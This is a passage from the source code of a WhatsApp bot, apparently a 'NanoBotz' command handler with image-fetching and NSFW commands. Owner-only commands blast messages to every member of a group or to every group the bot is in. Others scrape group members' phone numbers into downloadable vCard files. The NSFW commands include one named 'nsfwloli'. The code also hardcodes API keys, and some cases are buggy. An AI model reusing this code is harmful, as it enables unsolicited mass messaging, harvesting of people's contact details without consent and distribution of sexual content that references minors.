if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
NanoBotz.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break

case 'pushcontact': {
    if (!DanzTheCreator) return reply(mess.only.owner)
      if (!m.isGroup) return replynano(`The feature works only in grup`)
    if (!text) return replynano(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replynano(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    NanoBotz.sendMessage(pler, { text: q})
     }  
     replynano(`Done`)
      }
      break
case 'pushcontactv2':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (!q) return replynano(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await NanoBotz.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
NanoBotz.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replynano(`Success`)
}
break

case 'savecontact': case 'svcontact':{
if (!DanzTheCreator) return reply(`Specifically the owner`)
if (!m.isGroup) return reply(`FFeature for groups`)
let cmiggc = await NanoBotz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('*Import '+cmiggc.participants.length+' contact..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
NanoBotz.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
}
break
case "cekidch": case "idch": {
if (!text) return m.reply("Link")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Invalid link")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await NanoBotz.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Tidak"}
`
return m.reply(teks)
}
break
case 'cekidgc': {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await NanoBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *Group List below*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await NanoBotz.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `For use, please type the command ${prefix}pushcontactv2 id|text\n\nBefore using, please copy the Group ID above first`)
}
break
case 'savecontactv2': {
if (!DanzTheCreator) return reply(`Especially for the owner`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong use, please use a command like this\n${prefix+command} idgroup\nTo see the Group ID, please type .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await NanoBotz.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await NanoBotz.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'jpm':{
if (!DanzTheCreator) return reply(`Especially for the owner`)
if (!text) return reply(`*Wrong use please use it like this*\n${prefix+command} Text|Pause\n\nReply Images to Send Images to All Groups\nFor the break the delay is the nominal pause 1000 = 1 second`)
await reply("_Wait my master🚹_")
let getGroups = await NanoBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await NanoBotz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await NanoBotz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await NanoBotz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL🚹*")
}
break

case 'jpm2':{
if (!DanzTheCreator) return reply(`Especially for the owner`)
if (!text) return reply(`*Wrong use please use it like this*\n${prefix+command} text|Pause\n\nReply Images to Send Images to All Groups\nFor the break the delay is the nominal pause 1000 = 1 second`)
await reply("_Wait my Master🚹_")
let getGroups = await NanoBotz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await NanoBotz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await NanoBotz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await NanoBotz.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL🚹*")
}
break

case 'sendcontact': case 'contact':
if (!DanzTheCreator) return reply(`Especially for the owner`)
if (!m.isGroup) return reply(`Special group`)
if (!m.mentionedJid[0]) return reply('Ex; .contact @tag|number')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
NanoBotz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!DanzTheCreator) return reply(`Especially for the owner`)
if (!m.isGroup) return reply(`This feature is specifically for group`)
huhuhs = await NanoBotz.sendMessage(m.chat, {
    text: `Group; *${groupMetadata.subject}*\nTotal participant; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
NanoBotz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replynano(from)
           }
          break
          case 'userjid':{
          	if(!DanzTheCreator) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await NanoBotz.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replynano(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replynano(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replynano(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await NanoBotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
NanoBotz.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
NanoBotz.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await NanoBotz.sendMessage(m.chat, { caption:  `Here he is!!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
break
case 'ass':
case 'ahegao':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'femdom':
case 'food':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'neko-hentai':
case 'neko-hentai2':
case 'nsfwloli':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'hentai': {
 NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return m.reply(`💥 An error occurs when taking data: ${error.message}`);
  }
}
break

case 'yuri':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPrem) return replyprem(mess.premium)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await NanoBotz.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/NanoMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await NanoBotz.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
NanoBotz.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
reply(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
NanoBotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
NanoBotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await NanoBotz.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
reply(mess.wait)
